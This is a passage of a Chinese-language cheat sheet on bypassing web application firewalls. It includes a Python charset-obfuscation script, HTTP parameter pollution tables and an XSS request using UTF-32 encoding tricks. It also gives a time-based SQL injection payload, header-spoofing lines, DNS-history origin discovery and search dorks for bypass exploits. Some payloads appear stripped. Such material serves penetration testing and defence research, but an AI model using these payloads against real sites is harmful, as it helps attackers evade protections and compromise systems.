        else:
            if urlDecodeInput:
                params = urllib.parse.unquote(params)
            result = params.encode(charset)
            if urlEncodeOutput:
                result = urllib.parse.quote_plus(result)
        return result
    def main():
        print(lackofart)
        parser = ArgumentParser('python3 obfu.py')
        parser._action_groups.pop()
        # A simple hack to have required arguments and optional arguments separately
        required = parser.add_argument_group('Required Arguments')
        optional = parser.add_argument_group('Optional Arguments')
        # Required Options
        required.add_argument('-s', '--str', help='String to obfuscate', dest='str')
        required.add_argument('-e', '--enc', help='Encoding type. eg: ibm037, utf16, etc', dest='enc')
        # Optional Arguments (main stuff and necessary)
        optional.add_argument('-ueo', help='URL Encode Output', dest='ueo', action='store_true')
        optional.add_argument('-udi', help='URL Decode Input', dest='udi', action='store_true')
        args = parser.parse_args()
        if not len(sys.argv) > 1:
            parser.print_help()
            quit()
        print('Input: %s' % (args.str))
        print('Output: %s' % (paramEncode(params=args.str, charset=args.enc, urlDecodeInput=args.udi, urlEncodeOutput=args.ueo)))
    if __name__ == '__main__':
        main()
服务器信息 | 可用编码 | 说明  
---|---|---  
Nginx, uWSGI-Django-Python3 | IBM037, IBM500, cp875, IBM1026, IBM273 |
对参数名和参数值进行编码  
服务器会对参数名和参数值均进行url解码  
需要对等号和& and进行编码(不进行url编码)  
Nginx, uWSGI-Django-Python2 | IBM037, IBM500, cp875, IBM1026, utf-16, utf-32,
utf-32BE, IBM424 | 对参数名和参数值进行便慢慢  
服务器会对参数名和参数值均进行url解码  
等号和&符号不应该以任何方式编码。  
Apache-TOMCAT8-JVM1.8-JSP | IBM037, IBM500, IBM870, cp875, IBM1026, IBM01140,
IBM01141, IBM01142, IBM01143, IBM01144, IBM01145, IBM01146, IBM01147,
IBM01148, IBM01149, utf-16, utf-32, utf-32BE, IBM273, IBM277, IBM278, IBM280,
IBM284, IBM285, IBM290, IBM297, IBM420, IBM424, IBM-Thai, IBM871, cp1025 |
参数名按原始格式(可以像往常一样使用url编码)  
Body 不论是否经过url编码均可  
等号和&符号不应该以任何方式编码  
Apache-TOMCAT7-JVM1.6-JSP | IBM037, IBM500, IBM870, cp875, IBM1026, IBM01140,
IBM01141, IBM01142, IBM01143, IBM01144, IBM01145, IBM01146, IBM01147,
IBM01148, IBM01149, utf-16, utf-32, utf-32BE, IBM273, IBM277, IBM278, IBM280,
IBM284, IBM285, IBM297, IBM420, IBM424, IBM-Thai, IBM871, cp1025 |
参数名按原始格式(可以像往常一样使用url编码)  
Body 不论是否经过url编码均可  
等号和&符号不应该以任何方式编码  
IIS6, 7.5, 8, 10 -ASPX (v4.x) | IBM037, IBM500, IBM870, cp875, IBM1026,
IBM01047, IBM01140, IBM01141, IBM01142, IBM01143, IBM01144, IBM01145,
IBM01146, IBM01147, IBM01148, IBM01149, utf-16, unicodeFFFE, utf-32, utf-32BE,
IBM273, IBM277, IBM278, IBM280, IBM284, IBM285, IBM290, IBM297, IBM420,IBM423,
IBM424, x-EBCDIC-KoreanExtended, IBM-Thai, IBM871, IBM880, IBM905, IBM00924,
cp1025 | 参数名按原始格式(可以像往常一样使用url编码)  
Body 不论是否经过url编码均可  
等号和&符号不应该以任何方式编码  
### HTTP 参数污染
#### 手法
  * 这种攻击方法基于服务器如何解释具有相同名称的参数
  * 可能造成bypass的情况:
    * 服务器使用最后接收到的参数，WAF只检查第一个参数
    * 服务器将来自类似参数的值联合起来，WAF单独检查它们
下面是相关服务器对参数解释的比较
环境 | 参数解析 | 示例  
---|---|---  
ASP/IIS | 用逗号连接 | par1=val1,val2  
JSP, Servlet/Apache Tomcat | 第一个参数是结果 | par1=val1  
ASP.NET/IIS | 用逗号连接 | par1=val1,val2  
PHP/Zeus | 最后一个参数是结果 | par1=val2  
PHP/Apache | 最后一个参数是结果 | par1=val2  
JSP, Servlet/Jetty | 第一个参数是结果 | par1=val1  
IBM Lotus Domino | 第一个参数是结果 | par1=val1  
IBM HTTP Server | 最后一个参数是结果 | par1=val2  
mod_perl, libapeq2/Apache | 第一个参数是结果 | par1=val1  
Oracle Application Server 10G | 第一个参数是结果 | par1=val1  
Perl CGI/Apache | 第一个参数是结果 | par1=val1  
Python/Zope | 第一个参数是结果 | par1=val1  
IceWarp | 返回一个列表 | ['val1','val2']  
AXIS 2400 | 最后一个参数是结果 | par1=val2  
DBMan | 由两个波浪号连接起来 | par1=val1~~val2  
mod-wsgi (Python)/Apache | 返回一个列表 | ARRAY(0x8b9058c)  
### 浏览器 Bugs:
#### Charset Bugs:
  * 可以尝试 修改 charset header to 更高的 Unicode (eg. UTF-32) 
  * 当网站解码的时候，触发payload
Example request:
    GET /page.php?p=∀㸀㰀script㸀alert(1)㰀/script㸀 HTTP/1.1
    Host: site.com
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0
    Accept-Charset:utf-32; q=0.5alert(1);
    alert(1);
    confirm(0);
**标准** : ``  
**混淆** : `clickme`  
**变形** : `clickme`
#### 解析错误
  * RFC 声明节点名不可以由空白起始
  * 但是我们可以使用特殊字符 `%`, `//`, `!`, `?`, etc.
例子:
  * `` \- Works upto IE7 _([Source](http://html5sec.org/#71))_
  * `alert(1)` \- Works upto IE9 _([Reference](http://html5sec.org/#115))_
  * `` \- Works in IE7 _([Reference](http://html5sec.org/#77))_
  * `` \- Works Upto IE7
#### Unicode 分隔符
  * 每个浏览器有不同的分隔分隔符
[@Masato Kinugawa](https://github.com/masatokinugawa)fuzz 后发现如下
  * IExplorer: `0x09`, `0x0B`, `0x0C`, `0x20`, `0x3B`
  * Chrome: `0x09`, `0x20`, `0x28`, `0x2C`, `0x3B`
  * Safari: `0x2C`, `0x3B`
  * FireFox: `0x09`, `0x20`, `0x28`, `0x2C`, `0x3B`
  * Opera: `0x09`, `0x20`, `0x2C`, `0x3B`
  * Android: `0x09`, `0x20`, `0x28`, `0x2C`, `0x3B`
示例
    pwn3d
### 使用其他非典型等效语法结构替换
  * 找的waf开发人员没有注意到的语句进行攻击
一些WAF开发人员忽略的常见关键字:
  * JavaScript functions:
    * `window`
    * `parent`
    * `this`
    * `self`
  * Tag attributes:
    * `onwheel`
    * `ontoggle`
    * `onfilterchange`
    * `onbeforescriptexecute`
    * `ondragstart`
    * `onauxclick`
    * `onpointerover`
    * `srcdoc`
  * SQL Operators
    * `lpad`
                lpad( string, padded_length, [ pad_string ] ) lpad函数从左边对字符串使用指定的字符进行填充
        lpad('tech', 7); 将返回' tech'
        lpad('tech', 2); 将返回'te'
        lpad('tech', 8, '0'); 将返回'0000tech'
        lpad('tech on the net', 15, 'z'); 将返回'tech on the net'
        lpad('tech on the net', 16, 'z'); 将返回'ztech on the net
    * `field`
                FIELD(str,str1,str2,str3,...)
        返回的索引（从1开始的位置）的str在str1，str2，STR3，...列表中。如果str没有找到，则返回0。
        +---------------------------------------------------------+
        | FIELD('ej', 'Hej', 'ej', 'Heja', 'hej', 'foo')          |
        +---------------------------------------------------------+
        | 2                                                       |
        +---------------------------------------------------------+
    * `bit_count` 二进制数中包含1的个数。 BIT_COUNT(10);因为10转成二进制是1010，所以该结果就是2
示例payloads:
  * **Case:** XSS 
  * **Case:** SQLi 
        SELECT if(LPAD(' ',4,version())='5.7',sleep(5),null);
    1%0b||%0bLPAD(USER,7,1)
可以使用许多替代原生JavaScript的方法:
  * [JSFuck](http://www.jsfuck.com/)
  * [JJEncode](http://utf-8.jp/public/jjencode.html)
  * [XChars.JS](https://syllab.fr/projets/experiments/xcharsjs/5chars.pipeline.html)
### 滥用SSL/TLS密码:
  * 很多时候，服务器可以接收各种SSL/TLS密码和版本的连接。
  * 初始化到waf不支持的版本
  * 找出waf支持的密码(通常WAF供应商文档对此进行了讨论)。
  * 找出服务器支持的密码([SSLScan](https://github.com/rbsec/sslscan)这种工具可以帮助到你)。
  * 找出服务器支持但waf不支持的
> **Tool** : [abuse-ssl-bypass-waf](https://github.com/LandGrey/abuse-ssl-> bypass-waf)
### 滥用 DNS 记录:
  * 找到云waf后的源站
> **TIP:** 一些在线资源 [IP History](http://www.iphistory.ch/en/) 和 [DNS
> Trails](https://securitytrails.com/dns-trails)
**Tool** : [bypass-firewalls-by-DNS-history](https://github.com/vincentcox/bypass-firewalls-by-DNS-history)
    bash bypass-firewalls-by-DNS-history.sh -d  --checkall
### 请求头欺骗
  * 让waf以为请求来自于内部网络，进而不对其进行过滤。
添加如下请求头
    X-Originating-IP: 127.0.0.1
    X-Forwarded-For: 127.0.0.1
    X-Remote-IP: 127.0.0.1
    X-Remote-Addr: 127.0.0.1
    X-Client-IP: 127.0.0.1
### Google Dorks Approach:
  * 应对已知waf的绕过
#### 搜索语法
  * Normal search:  
`+ waf bypass`
  * Searching for specific version exploits:  
`" " (bypass|exploit)`
  * For specific type bypass exploits:  
`"" + (bypass|exploit)`
  * On [Exploit DB](https://exploit-db.com):  
`site:exploit-db.com + bypass`
  * On [0Day Inject0r DB](https://0day.today):  
`site:0day.today +  (bypass|exploit)`
  * On [Twitter](https://twitter.com):  
`site:twitter.com + bypass`
  * On [Pastebin](https://pastebin.com)  
`site:pastebin.com + bypass`